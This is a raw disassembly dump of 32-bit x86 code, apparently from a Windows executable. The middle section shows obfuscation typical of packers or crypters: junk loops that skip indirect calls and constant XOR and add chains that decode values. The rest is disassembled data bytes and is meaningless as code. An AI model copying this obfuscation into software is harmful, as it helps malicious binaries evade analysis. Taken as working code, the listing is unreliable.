  419135:	and    al,0xbe
  419137:	call   0xa5cace4f
  41913c:	push   edi
  41913d:	fsubr  QWORD PTR [edi-0x1]
  419140:	lock push 0x200900d9
  419146:	lds    ecx,FWORD PTR ds:0x77a2fcb0
  41914c:	pushf  
  41914d:	push   esp
  41914e:	(bad)  
  41914f:	xchg   ecx,eax
  419150:	loope  0x4191a8
  419152:	xor    eax,0xbbd21087
  419157:	sub    ecx,DWORD PTR [esi-0x521c5221]
  41915d:	daa    
  41915e:	gs xor al,0xd2
  419161:	inc    DWORD PTR [esi+0x636c2290]
  419167:	jmp    0x574f:0xda10950e
  41916e:	push   ebp
  41916f:	out    0x67,al
  419171:	repnz fimul WORD PTR [ebx]
  419174:	add    bl,BYTE PTR [esi-0x7beba743]
  41917a:	xor    eax,0x4d30141f
  41917f:	leave  
  419180:	out    0x3a,al
  419182:	popf   
  419183:	fwait
  419184:	adc    al,BYTE PTR [edx]
  419186:	inc    DWORD PTR es:[edx+0x6c23108f]
  41918d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41918e:	adc    ch,0xae
  419191:	jne    0x41914f
  419193:	scas   eax,DWORD PTR es:[edi]
  419194:	clc    
  419195:	addr16 push ss
  419197:	cmp    BYTE PTR [esi+ecx*4+0x54],0x59
  41919c:	in     al,0x41
  41919e:	fs popa 
  4191a0:	out    dx,eax
  4191a1:	xor    al,BYTE PTR [esi+0x4d65b4ef]
  4191a7:	loop   0x41913f
  4191a9:	pop    ss
  4191aa:	or     DWORD PTR [edi],esi
  4191ac:	ins    DWORD PTR es:[edi],dx
  4191ad:	jbe    0x41913a
  4191af:	dec    eax
  4191b0:	outs   dx,DWORD PTR ds:[esi]
  4191b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b2:	call   0x828819a5
  4191b7:	bound  edi,QWORD PTR [ecx]
  4191b9:	(bad)  [ecx]
  4191bb:	inc    edx
  4191bc:	hlt    
  4191bd:	das    
  4191be:	test   al,0x5d
  4191c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191c1:	std    
  4191c2:	or     bl,BYTE PTR [edx+0x78]
  4191c5:	outs   dx,BYTE PTR ds:[esi]
  4191c6:	mul    DWORD PTR [ebp+0x26]
  4191c9:	scas   al,BYTE PTR es:[edi]
  4191ca:	(bad)  
  4191cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191cc:	fcomp  DWORD PTR [esi+0x2b]
  4191cf:	retf   0xce2b
  4191d2:	xor    ecx,eax
  4191d4:	mov    DWORD PTR [ebp+0x8],ecx
  4191d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4191da:	mov    edx,DWORD PTR [ebp-0x58]
  4191dd:	add    ecx,0x5708fa
  4191e3:	imul   ecx,edx
  4191e6:	mov    DWORD PTR [ebp-0x58],ecx
  4191e9:	mov    ecx,DWORD PTR [ebp+0x8]
  4191ec:	mov    edx,DWORD PTR [ebp-0x54]
  4191ef:	add    ecx,0x64f89c
  4191f5:	or     ecx,edx
  4191f7:	mov    DWORD PTR [ebp-0x54],ecx
  4191fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4191fd:	mov    edx,DWORD PTR [ebp-0x50]
  419200:	add    ecx,0x242ebcd
  419206:	xor    ecx,edx
  419208:	mov    DWORD PTR [ebp-0x50],ecx
  41920b:	mov    ecx,DWORD PTR [ebp+0x8]
  41920e:	mov    edx,DWORD PTR [ebp-0x4c]
  419211:	add    ecx,edi
  419213:	and    ecx,edx
  419215:	mov    DWORD PTR [ebp-0x4c],ecx
  419218:	mov    ecx,DWORD PTR [ebp+0x8]
  41921b:	mov    edx,DWORD PTR [ebp-0x48]
  41921e:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419225:	mov    DWORD PTR [ebp-0x48],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,0xfa5e1530
  419230:	sub    edx,ecx
  419232:	add    edx,DWORD PTR [ebp-0x44]
  419235:	mov    DWORD PTR [ebp-0x44],edx
  419238:	mov    ecx,DWORD PTR [ebp+0x8]
  41923b:	xor    ecx,eax
  41923d:	add    ecx,esi
  41923f:	jne    0x416e3c
  419245:	jmp    0x4192d7
  41924a:	mov    ecx,DWORD PTR [ebp+0x8]
  41924d:	mov    edx,DWORD PTR [ebp-0x8]
  419250:	xor    ecx,eax
  419252:	xor    edx,eax
  419254:	sub    ecx,edx
  419256:	sub    ecx,esi
  419258:	xor    ecx,eax
  41925a:	mov    DWORD PTR [ebp+0x8],ecx
  41925d:	mov    ecx,DWORD PTR [ebp+0x8]
  419260:	mov    edx,DWORD PTR [ebp-0x58]
  419263:	add    ecx,0x5708fa
  419269:	imul   ecx,edx
  41926c:	mov    DWORD PTR [ebp-0x58],ecx
  41926f:	mov    ecx,DWORD PTR [ebp+0x8]
  419272:	mov    edx,DWORD PTR [ebp-0x54]
  419275:	add    ecx,0x64f89c
  41927b:	or     ecx,edx
  41927d:	mov    DWORD PTR [ebp-0x54],ecx
  419280:	mov    ecx,DWORD PTR [ebp+0x8]
  419283:	mov    edx,DWORD PTR [ebp-0x50]
  419286:	add    ecx,0x242ebcd
  41928c:	xor    ecx,edx
  41928e:	mov    DWORD PTR [ebp-0x50],ecx
  419291:	mov    ecx,DWORD PTR [ebp+0x8]
  419294:	mov    edx,DWORD PTR [ebp-0x4c]
  419297:	add    ecx,edi
  419299:	and    ecx,edx
  41929b:	mov    DWORD PTR [ebp-0x4c],ecx
  41929e:	mov    ecx,DWORD PTR [ebp+0x8]
  4192a1:	mov    edx,DWORD PTR [ebp-0x48]
  4192a4:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192ab:	mov    DWORD PTR [ebp-0x48],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,0xfa5e1530
  4192b6:	sub    edx,ecx
  4192b8:	add    edx,DWORD PTR [ebp-0x44]
  4192bb:	mov    DWORD PTR [ebp-0x44],edx
  4192be:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c1:	xor    ecx,eax
  4192c3:	add    ecx,esi
  4192c5:	jne    0x41924a
  4192cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4192ce:	xor    ecx,eax
  4192d0:	mov    eax,DWORD PTR [ebp+0x10]
  4192d3:	add    ecx,esi
  4192d5:	mov    DWORD PTR [eax],ecx
  4192d7:	pop    edi
  4192d8:	pop    esi
  4192d9:	pop    ebx
  4192da:	leave  
  4192db:	ret    0xc
  4192de:	push   ebp
  4192df:	mov    ebp,esp
  4192e1:	sub    esp,0x78
  4192e4:	inc    eax
  4192e5:	push   esi
  4192e6:	xor    DWORD PTR ds:0x42a452,edi
  4192ec:	push   edi
  4192ed:	mov    eax,ds:0x42941e
  4192f2:	mov    DWORD PTR [ebp-0x24],eax
  4192f5:	add    DWORD PTR ds:0x42a40e,edi
  4192fb:	mov    eax,ds:0x42953e
  419300:	dec    DWORD PTR ds:0x42a412
  419306:	mov    DWORD PTR [ebp-0x30],eax
  419309:	mov    eax,ds:0x42a486
  41930e:	mov    eax,DWORD PTR [eax]
  419310:	xor    DWORD PTR ds:0x42a3f2,eax
  419316:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41931d:	mov    DWORD PTR ds:0x42a3f2,0x1f
  419327:	cmp    DWORD PTR ds:0x42a3f2,0x0
  41932e:	je     0x419363
  419334:	cmp    DWORD PTR ds:0x42a3f2,0x27
  41933b:	jge    0x419363
  419341:	jmp    0x419351
  419346:	push   0x203c
  41934b:	call   DWORD PTR ds:0x42a526
  419351:	mov    edi,DWORD PTR ds:0x42a3f2
  419357:	dec    edi
  419358:	mov    DWORD PTR ds:0x42a3f2,edi
  41935e:	jmp    0x419327
  419363:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  41936a:	sub    ecx,0x2563
  419370:	mov    eax,DWORD PTR [ebp-0x10]
  419373:	or     ecx,edi
  419375:	mov    ecx,DWORD PTR [ebp-0x10]
  419378:	sub    edi,DWORD PTR ds:0x42a446
  41937e:	sub    eax,ecx
  419380:	mov    DWORD PTR [ebp-0x10],eax
  419383:	and    DWORD PTR ds:0x42a42e,0x0
  41938d:	jmp    0x4193a1
  419392:	xor    edi,edi
  419394:	add    edi,DWORD PTR ds:0x42a42e
  41939a:	inc    edi
  41939b:	mov    DWORD PTR ds:0x42a42e,edi
  4193a1:	cmp    DWORD PTR ds:0x42a42e,0x1b
  4193a8:	jae    0x4193f0
  4193ae:	cmp    DWORD PTR ds:0x42a42e,0x7
  4193b5:	ja     0x4193f0
  4193bb:	jmp    0x4193d1
  4193c0:	push   0x160a
  4193c5:	push   DWORD PTR [ebp-0x28]
  4193c8:	push   DWORD PTR [ebp-0x28]
  4193cb:	call   DWORD PTR ds:0x42a52a
  4193d1:	cmp    DWORD PTR ds:0x42a42e,0x6
  4193d8:	jne    0x4193eb
  4193de:	mov    edi,DWORD PTR ds:0x42a42e
  4193e4:	inc    edi
  4193e5:	mov    DWORD PTR ds:0x42a42e,edi
  4193eb:	jmp    0x419392
  4193f0:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  4193f7:	add    DWORD PTR ds:0x42a3b2,edx
  4193fd:	mov    eax,DWORD PTR [ebp-0x18]
  419400:	mov    ecx,DWORD PTR [ebp-0x18]
  419403:	sub    eax,ecx
  419405:	mov    DWORD PTR [ebp-0x18],eax
  419408:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  41940f:	and    DWORD PTR ds:0x42a3e2,0x0
  419419:	mov    ecx,DWORD PTR ds:0x42a3e2
  41941f:	inc    ecx
  419420:	mov    DWORD PTR ds:0x42a3e2,ecx
  419426:	cmp    DWORD PTR ds:0x42a3e2,0x24
  41942d:	jge    0x419460
  419433:	jmp    0x419453
  419438:	push   DWORD PTR [ebp-0x10]
  41943b:	push   DWORD PTR [ebp-0x10]
  41943e:	push   0x788a
  419443:	push   0x4432
  419448:	push   0x42a3e2
  41944d:	call   DWORD PTR ds:0x42a52e
  419453:	cmp    DWORD PTR ds:0x42a3e2,0x19
  41945a:	jb     0x419419
  419460:	mov    eax,DWORD PTR [ebp-0xc]
  419463:	add    DWORD PTR ds:0x42a436,0x42a42a
  41946d:	mov    ecx,DWORD PTR [ebp-0xc]
  419470:	adc    esi,edi
  419472:	sub    eax,ecx
  419474:	or     DWORD PTR ds:0x42a3ee,ebx
  41947a:	mov    DWORD PTR [ebp-0xc],eax
  41947d:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  419484:	sub    DWORD PTR ds:0x42a3ba,0x3296
  41948e:	mov    eax,DWORD PTR [ebp-0x1c]
  419491:	mov    ecx,DWORD PTR [ebp-0x1c]
  419494:	sbb    edi,edi
  419496:	sub    eax,ecx
  419498:	adc    DWORD PTR ds:0x42a402,edi
  41949e:	mov    DWORD PTR [ebp-0x1c],eax
  4194a1:	add    esi,eax
  4194a3:	or     DWORD PTR [ebp-0x1c],0xf89c8599
  4194aa:	mov    DWORD PTR ds:0x42a44a,0x13
  4194b4:	cmp    DWORD PTR ds:0x42a44a,0x0
  4194bb:	je     0x4194f5
  4194c1:	cmp    DWORD PTR ds:0x42a44a,0x22
  4194c8:	jge    0x4194f5
  4194ce:	jmp    0x4194e1
  4194d3:	push   DWORD PTR [ebp-0x20]
  4194d6:	push   0x3f6d
  4194db:	call   DWORD PTR ds:0x42a532
  4194e1:	xor    ecx,ecx
  4194e3:	add    ecx,DWORD PTR ds:0x42a44a
  4194e9:	dec    ecx
  4194ea:	mov    DWORD PTR ds:0x42a44a,ecx
  4194f0:	jmp    0x4194b4
  4194f5:	mov    eax,DWORD PTR [ebp-0x20]
  4194f8:	mov    ecx,DWORD PTR [ebp-0x20]
  4194fb:	sub    eax,ecx
  4194fd:	mov    DWORD PTR [ebp-0x20],eax
  419500:	mov    eax,DWORD PTR [ebp-0x2c]
  419503:	mov    DWORD PTR ds:0x42a3c2,0x10
  41950d:	cmp    DWORD PTR ds:0x42a3c2,0x0
  419514:	je     0x419563
  41951a:	cmp    DWORD PTR ds:0x42a3c2,0x9
  419521:	jb     0x419563
  419527:	jmp    0x419535
  41952c:	push   DWORD PTR [ebp-0x10]
  41952f:	call   DWORD PTR ds:0x42a53a
  419535:	cmp    DWORD PTR ds:0x42a3c2,0xa
  41953c:	jne    0x419551
  419542:	xor    esi,esi
  419544:	xor    esi,DWORD PTR ds:0x42a3c2
  41954a:	dec    esi
  41954b:	mov    DWORD PTR ds:0x42a3c2,esi
  419551:	mov    esi,DWORD PTR ds:0x42a3c2
  419557:	dec    esi
  419558:	mov    DWORD PTR ds:0x42a3c2,esi
  41955e:	jmp    0x41950d
  419563:	mov    ecx,DWORD PTR [ebp-0x20]
  419566:	mov    esi,0x75108a8
  41956b:	xor    eax,esi
  41956d:	mov    edi,0x3272ef
  419572:	add    eax,edi
  419574:	or     eax,ecx
  419576:	mov    DWORD PTR [ebp-0x20],eax
  419579:	mov    eax,DWORD PTR [ebp-0x4]
  41957c:	mov    ecx,DWORD PTR [ebp-0x4]
  41957f:	sub    eax,ecx
  419581:	mov    DWORD PTR [ebp-0x4],eax
  419584:	or     DWORD PTR [ebp-0x4],0xf89c85be
  41958b:	mov    eax,DWORD PTR [ebp-0xc]
  41958e:	xor    eax,esi
  419590:	add    eax,edi
  419592:	push   eax
  419593:	mov    eax,DWORD PTR [ebp-0x10]
  419596:	xor    eax,esi
  419598:	add    eax,edi
  41959a:	push   eax
  41959b:	mov    eax,DWORD PTR [ebp-0x4]
  41959e:	xor    eax,esi
  4195a0:	add    eax,edi
  4195a2:	push   eax
  4195a3:	lea    eax,[ebp-0x78]
  4195a6:	push   eax
  4195a7:	push   DWORD PTR [ebp-0x2c]
  4195aa:	push   DWORD PTR [ebp-0x28]
  4195ad:	call   0x40f7af
  4195b2:	test   eax,eax
  4195b4:	je     0x4195e2
  4195ba:	lea    eax,[ebp-0x78]
  4195bd:	push   eax
  4195be:	mov    eax,DWORD PTR [ebp-0x28]
  4195c1:	xor    eax,esi
  4195c3:	add    eax,edi
  4195c5:	push   eax
  4195c6:	mov    eax,DWORD PTR [ebp-0x24]
  4195c9:	add    eax,0xaa
  4195ce:	push   eax
  4195cf:	mov    eax,DWORD PTR [ebp-0x24]
  4195d2:	mov    eax,DWORD PTR [eax+0x198]
  4195d8:	push   DWORD PTR [eax]
  4195da:	call   0x40a946
  4195df:	mov    DWORD PTR [ebp-0x14],eax
  4195e2:	mov    ecx,DWORD PTR ds:0x429516
  4195e8:	lea    eax,[ebp+0x4]
  4195eb:	jmp    0x41b96b
  4195f0:	jge    0x41963e
  4195f2:	pop    es
  4195f3:	add    BYTE PTR [edi],al
  4195f5:	sti    
  4195f6:	jge    0x4195f3
  4195f8:	jne    0x41963d
  4195fa:	pop    ecx
  4195fb:	in     al,0x5d
  4195fd:	(bad)  [ebx]
  4195ff:	pop    esi
  419600:	je     0x419621
  419602:	jns    0x41967e
  419604:	pop    ds
  419605:	pop    edi
  419606:	jp     0x419682
  419608:	add    eax,0x1ed82ac7
  41960d:	mov    eax,0x13343850
  419612:	lds    esi,FWORD PTR [edi]
  419614:	mov    ebp,0x593aabd2
  419619:	loop   0x419604
  41961b:	scas   eax,DWORD PTR es:[edi]
  41961c:	push   esi
  41961d:	in     eax,dx
  41961e:	pop    eax
  41961f:	cmp    eax,0x6f92741b
  419624:	rol    BYTE PTR [eax+0x41],1
  419627:	push   esp
  419628:	mov    edx,0x1fe8adcb
  41962d:	(bad)  [esi]
  41962f:	test   BYTE PTR [ecx],dh
  419631:	mov    ch,0xca
  419633:	jns    0x4195e9
  419635:	cdq    
  419636:	jge    0x419684
  419638:	jg     0x419628
  41963a:	inc    edx
  41963b:	(bad)  
  41963c:	sub    ch,BYTE PTR [edx-0xe816cd8]
  419642:	aaa    
  419643:	jge    0x4196a8
  419645:	and    ecx,DWORD PTR [eax-0x59c7da12]
  41964b:	rol    esp,cl
  41964d:	jns    0x419676
  41964f:	sbb    eax,0x45f06165
  419654:	pop    edi
  419655:	ja     0x419653
  419657:	int    0xaf
  419659:	sub    cl,dl
  41965b:	mov    ecx,ebp
  41965d:	rol    BYTE PTR [edx-0x12348404],1
  419663:	sbb    al,0x7f
  419665:	pop    edi
  419666:	arpl   di,sp
  419668:	or     esp,esp
  41966a:	and    BYTE PTR [edx+edi*4-0x64],dh
  41966e:	or     ah,BYTE PTR [edx]
  419670:	jp     0x419679
  419672:	dec    eax
  419673:	or     ch,cl
  419675:	and    esp,DWORD PTR [ebp+ebp*2+0x45dedb09]
  41967c:	sub    bh,BYTE PTR [esi+0x21bd3d62]
  419682:	ins    DWORD PTR es:[edi],dx
  419683:	and    BYTE PTR ds:0x61c0a453,ah
  419689:	and    eax,0xfc53d572
  41968e:	and    dh,BYTE PTR [ebp-0x2a31bbea]
  419694:	pop    ebp
  419695:	scas   al,BYTE PTR es:[edi]
  419696:	out    0x72,eax
  419698:	iret   
  419699:	jne    0x419622
  41969b:	stos   DWORD PTR es:[edi],eax
  41969c:	adc    BYTE PTR [eax+0x71],dh
  41969f:	(bad)  
  4196a0:	icebp  
  4196a1:	sti    
  4196a2:	mov    cl,0x73
  4196a4:	dec    edi
  4196a5:	dec    esp
  4196a6:	push   ebp
  4196a7:	fistp  WORD PTR [eax+0x2c]
  4196aa:	imul   ebp,eax,0x70
  4196ad:	clc    
  4196ae:	in     al,dx
  4196af:	sbb    al,0x32
  4196b1:	mov    ebp,0x5584a2f9
  4196b6:	xor    ebx,DWORD PTR [ebp+ebp*4+0x6e9dbb0d]
  4196bd:	xor    edi,DWORD PTR [edi+0x5c67ff67]
  4196c3:	inc    esi
  4196c4:	mov    bh,BYTE PTR [edi-0x6d24059f]
  4196ca:	xchg   ebp,eax
  4196cb:	stos   BYTE PTR es:[edi],al
  4196cc:	xor    esi,DWORD PTR [ecx]
  4196ce:	ins    DWORD PTR es:[edi],dx
  4196cf:	pushf  
  4196d0:	sub    edi,eax
  4196d2:	dec    edi
  4196d3:	aas    
  4196d4:	mov    bh,0x6e
  4196d6:	xlat   BYTE PTR ds:[ebx]
  4196d7:	call   0xc889:0x99f41116
  4196de:	shl    BYTE PTR [edx],1
  4196e0:	js     0x41972e
  4196e2:	out    dx,eax
  4196e3:	dec    esp
  4196e4:	out    dx,eax
  4196e5:	stos   DWORD PTR es:[edi],eax
  4196e6:	mov    cl,0x4
  4196e8:	addr16 pusha 
  4196ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196eb:	push   ss
  4196ec:	mov    BYTE PTR [esi+0x6a58ec4e],ah
  4196f2:	or     DWORD PTR [eax+0x4b],ebp
  4196f5:	(bad)  
  4196f6:	cli    
  4196f7:	retf   
  4196f8:	push   es
  4196f9:	shl    ch,0x86
  4196fc:	into   
  4196fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196fe:	cmp    BYTE PTR [eax],al
  419700:	dec    edi
  419701:	xor    eax,0x363fbf1
  419706:	(bad)  
  419707:	push   esi
  419708:	and    eax,DWORD PTR cs:[esi+edi*2+0x48]
  41970d:	add    al,0x10
  41970f:	pop    esp
  419710:	xchg   edi,eax
  419711:	jne    0x4196fd
  419713:	fmulp  st(4),st
  419715:	add    DWORD PTR [edx-0x429168a6],esi
  41971b:	xchg   ebx,eax
  41971c:	mov    al,0x87
  41971e:	cmp    DWORD PTR [esi-0x18],esp
  419721:	dec    edi
  419722:	icebp  
  419723:	jns    0x41975c
  419725:	sub    al,0x7f
  419727:	xchg   ebp,eax
  419728:	add    bl,BYTE PTR [ecx+0x6b]
  41972b:	mov    bh,0x2c
  41972d:	aaa    
  41972e:	in     al,0xce
  419730:	pop    ss
  419731:	idiv   DWORD PTR [edi]
  419733:	je     0x4197a2
  419735:	mov    ebx,0x454117b4
  41973a:	outs   dx,BYTE PTR ds:[esi]
  41973b:	sti    
  41973c:	jge    0x419786
  41973e:	and    al,0xfb
  419740:	cmp    bl,cl
  419742:	mov    bl,ch
  419744:	xor    eax,0x6af72d0e
  419749:	cs push eax
  41974b:	jle    0x41979f
  41974d:	cmp    al,0xaf
  41974f:	(bad)  
  419750:	outs   dx,BYTE PTR ds:[esi]
  419751:	dec    esi
  419752:	mov    esp,0xd3866981
  419757:	push   ss
  419758:	aam    0xc0
  41975a:	jl     0x419757
  41975c:	cli    
  41975d:	cmp    BYTE PTR [ecx+0x12],bh
  419760:	test   al,bl
  419762:	loop   0x419752
  419764:	pop    esp
  419765:	adc    eax,0x3be2190b
  41976a:	cmp    eax,0x7971754d
  41976f:	in     eax,0x42
  419771:	test   al,dh
  419773:	push   edx
  419774:	pop    ss
  419775:	lods   al,BYTE PTR ds:[esi]
  419776:	xchg   ecx,eax
  419777:	shl    BYTE PTR [ecx+0x38d59edc],cl
  41977d:	retf   0xc15b
  419780:	or     al,0x50
  419782:	push   edi
  419783:	cdq    
  419784:	add    BYTE PTR [eax],ah
  419786:	pop    eax
  419787:	stc    
  419788:	mov    ecx,DWORD PTR [edi-0x6361a267]
  41978e:	pushf  
  41978f:	adc    bl,BYTE PTR [edx]
  419791:	lahf   
  419792:	call   0x65e:0x3f367745
  419799:	sub    ah,dl
  41979b:	mov    ecx,0x1f6f7f2e
  4197a0:	adc    al,0x44
  4197a2:	dec    edi
  4197a3:	jo     0x419776
  4197a5:	mov    BYTE PTR [ecx+0x77],dl
  4197a8:	(bad)  
  4197a9:	sbb    BYTE PTR [ebp-0x7f],bl
  4197ac:	sub    eax,0x22befef0
  4197b1:	adc    BYTE PTR [esi-0x5e],ch
  4197b4:	and    al,0x66
  4197b6:	(bad)  
  4197b7:	cld    
  4197b8:	jae    0x419829
  4197ba:	or     DWORD PTR [ecx-0x16],edi
  4197bd:	mov    dh,0xd7
  4197bf:	cmp    ecx,DWORD PTR [esi]
  4197c1:	mov    ch,0xb8
  4197c3:	fidiv  DWORD PTR [esi-0x7582fa76]
  4197c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ca:	fstp   QWORD PTR [edx+edi*8]
  4197cd:	xchg   ebp,eax
  4197ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197cf:	popa   
  4197d0:	mov    esp,?
  4197d2:	lods   al,BYTE PTR ds:[esi]
  4197d3:	and    BYTE PTR [edx],ch
  4197d5:	mov    esi,0x723b3bfe
  4197da:	mov    cl,0x27
  4197dc:	cmp    DWORD PTR ds:0x53f7a06d,esp
  4197e2:	xchg   esi,eax
  4197e3:	mov    WORD PTR [ecx+0x4416f6ed],?
  4197e9:	daa    
  4197ea:	jno    0x419805
  4197ec:	adc    eax,0x1d82cb30
  4197f1:	jns    0x419866
  4197f3:	sub    eax,0xabca7cab
  4197f8:	ret    0x1745
  4197fb:	mov    ds:0x56162e7f,al
  419800:	fdivr  QWORD PTR [ebp-0x3f]
  419803:	dec    esp
  419804:	test   eax,0x846e1622
  419809:	dec    ebp
  41980a:	adc    edx,edi
  41980c:	jns    0x419821
  41980e:	retf   0xc8fc
  419811:	stc    
  419812:	je     0x419835
  419814:	mov    ds:0x5398f6bd,eax
  419819:	mov    esi,0x25f7861b
  41981e:	and    bh,ah
  419820:	clc    
  419821:	in     al,0xa7
  419823:	push   es
  419824:	bound  esi,QWORD PTR [edi+esi*1-0x13be8b3d]
  41982b:	nop
  41982c:	mov    gs,WORD PTR [edi]
  41982e:	mov    al,0x74
  419830:	dec    esi
  419831:	adc    DWORD PTR [ecx],ebx
  419833:	mov    dh,0x83
  419835:	fld    DWORD PTR [ebx+0x73]
  419838:	cmp    BYTE PTR [eax],bl
  41983a:	push   es
  41983b:	in     eax,0x1d
  41983d:	aas    
  41983e:	(bad)  
  41983f:	out    dx,al
  419840:	test   eax,0x65b22e92
  419845:	inc    eax
  419846:	dec    edi
  419847:	repz push esi
  419849:	lgs    ebp,FWORD PTR [esi+0x7d]
  41984d:	lea    ebp,[ecx-0x1]
  419850:	sub    dh,BYTE PTR [ebx+0x612c02d]
  419856:	je     0x4198d3
  419858:	sub    dl,bl
  41985a:	sbb    bl,ch
  41985c:	xchg   ebx,eax
  41985d:	dec    eax
  41985e:	(bad)  
  41985f:	pushf  
  419860:	add    esp,0xc72a283
  419866:	js     0x41987d
  419868:	rcl    esp,cl
  41986a:	pop    ss
  41986b:	dec    eax
  41986c:	std    
  41986d:	mov    edx,edi
  41986f:	iret   
  419870:	in     al,dx
  419871:	and    BYTE PTR [esi+0x1a],0xcf
  419875:	push   es
  419876:	mov    edx,0xce0fbc5
  41987b:	jns    0x419806
  41987d:	fldcw  WORD PTR [ecx]
  41987f:	icebp  
  419880:	jmp    0x2fba9650
  419885:	mov    ah,0x72
  419887:	int    0x89
  419889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41988a:	sbb    ch,BYTE PTR [esi+0x71b937a4]
  419890:	ret    
  419891:	mov    ecx,0x37def9f6
  419896:	xor    eax,0xe2e643c8
  41989b:	dec    esi
  41989c:	mov    bh,0x78
  41989e:	push   cs
  41989f:	test   al,0xa0
  4198a1:	add    esi,0x7a7e5cc0
  4198a7:	sub    ebp,DWORD PTR [esi-0x41c3c9a6]
  4198ad:	retf   0x822e
  4198b0:	or     eax,0x22142bab
  4198b5:	shr    BYTE PTR [eax],cl
  4198b7:	rol    BYTE PTR [ebp-0x5b],1
  4198ba:	(bad)  
  4198bb:	xor    bh,BYTE PTR [edx-0x7261d3d3]
  4198c1:	push   es
  4198c2:	xor    al,0x6e
  4198c4:	jo     0x4198b5
  4198c6:	ret    
  4198c7:	js     0x4198c3
  4198c9:	shr    BYTE PTR [edi-0x33],1
  4198cc:	setne  BYTE PTR [eiz*4+0xc87bee0]
  4198d4:	dec    esi
  4198d5:	xlat   BYTE PTR ds:[ebx]
  4198d6:	jle    0x419876
  4198d8:	push   ss
  4198d9:	push   ds
  4198da:	sbb    ch,BYTE PTR [edi]
  4198dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198dd:	out    dx,eax
  4198de:	pop    esi
  4198df:	ins    BYTE PTR es:[edi],dx
  4198e0:	fldcw  WORD PTR [esi+0x183c70c2]
  4198e6:	adc    bh,al
  4198e8:	pop    ebp
  4198e9:	dec    ebx
  4198ea:	xchg   esi,eax
  4198eb:	(bad)  
  4198ec:	(bad)  [ebp+0x6d]
  4198ef:	lods   eax,DWORD PTR ds:[esi]
  4198f0:	aad    0x49
  4198f2:	test   eax,0xc89a3ce8
  4198f7:	pop    esp
  4198f8:	xlat   BYTE PTR ds:[ebx]
  4198f9:	mov    ch,BYTE PTR [ebx-0x36]
  4198fc:	xor    eax,0x2257b334
  419901:	jg     0x41995c
  419903:	jae    0x419897
  419905:	iret   
  419906:	xchg   BYTE PTR [ebp-0x14],bh
  419909:	inc    esi
  41990a:	scas   eax,DWORD PTR es:[edi]
  41990b:	add    BYTE PTR [ebx],cl
  41990d:	mov    ah,0x40
  41990f:	aad    0xf8
  419911:	push   eax
  419912:	mov    ch,0x17
  419914:	mov    bh,0x62
  419916:	inc    ecx
  419917:	iret   
  419918:	cmc    
  419919:	push   ecx
  41991a:	xor    eax,0x612687da
  41991f:	sti    
  419920:	xchg   edi,eax
  419921:	iret   
  419922:	aam    0xe5
  419924:	iret   
  419925:	jge    0x419903
  419927:	push   esi
  419928:	xor    dh,BYTE PTR [ecx+edx*1-0xc]
  41992c:	sub    eax,0xbd0d156f
  419931:	or     eax,0x909e220e
  419936:	jmp    0x1608:0xd838265a
  41993d:	or     eax,0x6815056d
  419942:	jmp    0x41996d
  419944:	sbb    dh,ch
  419946:	adc    DWORD PTR [ebp+0x6f],ebp
  419949:	push   ss
  41994a:	test   eax,0x7ae2bfc3
  41994f:	mov    edx,0x9036ff42
  419954:	xchg   edx,eax
  419955:	loop   0x419937
  419957:	cli    
  419958:	out    0x30,al
  41995a:	call   0x8253:0x150b17e2
  419961:	mov    eax,ds:0x8f6aa554
  419966:	test   BYTE PTR [ebx-0x33],bh
  419969:	jno    0x419915
  41996b:	test   DWORD PTR [esi-0x2e0db470],ecx
  419971:	or     BYTE PTR [ebp+0x33],0xf4
  419975:	in     eax,0xdf
  419977:	lds    di,DWORD PTR [eax-0x7153a8c5]
  41997e:	and    ebp,DWORD PTR [ebp+0x24]
  419981:	sub    BYTE PTR [ecx-0x3f04fba1],dl
  419987:	pop    ds
  419988:	jno    0x4199a2
  41998a:	rol    bl,cl
  41998c:	js     0x419a0a
  41998e:	sahf   
  41998f:	add    DWORD PTR [eax+edi*8+0xfd1f910],edx
  419996:	out    0x86,al
  419998:	xor    ah,BYTE PTR [ecx]
  41999a:	add    ch,al
  41999c:	jp     0x419991
  41999e:	pop    es
  41999f:	jmp    0x32ba7c27
  4199a4:	hlt    
  4199a5:	push   0x389b309e
  4199aa:	wrmsr  
  4199ac:	popa   
  4199ad:	aam    0xc0
  4199af:	cmp    DWORD PTR ss:[eax-0x4628f59f],ebx
  4199b6:	imul   ecx,DWORD PTR [ebx],0x1d
  4199b9:	cmp    eax,0x9ec4bac1
  4199be:	xchg   al,dl
  4199c0:	add    eax,DWORD PTR [esi]
  4199c2:	addr16 ja 0x419a29
  4199c5:	sbb    DWORD PTR [esi*1-0x2c5d1565],0xffffffa0
  4199cd:	cmp    cl,ch
  4199cf:	or     BYTE PTR [ecx+0x28],0x92
  4199d3:	push   edi
  4199d4:	dec    DWORD PTR [ebx]
  4199d6:	push   es
  4199d7:	fucomi st,st(0)
  4199d9:	xchg   ecx,eax
  4199da:	mov    ?,WORD PTR [ebp+0x3010e32]
  4199e0:	test   eax,0x4a3098c0
  4199e5:	mov    eax,0xba9d6948
  4199ea:	or     ah,BYTE PTR [edx]
  4199ec:	or     BYTE PTR [edx-0x6af4475f],0x89
  4199f3:	lods   eax,DWORD PTR ds:[esi]
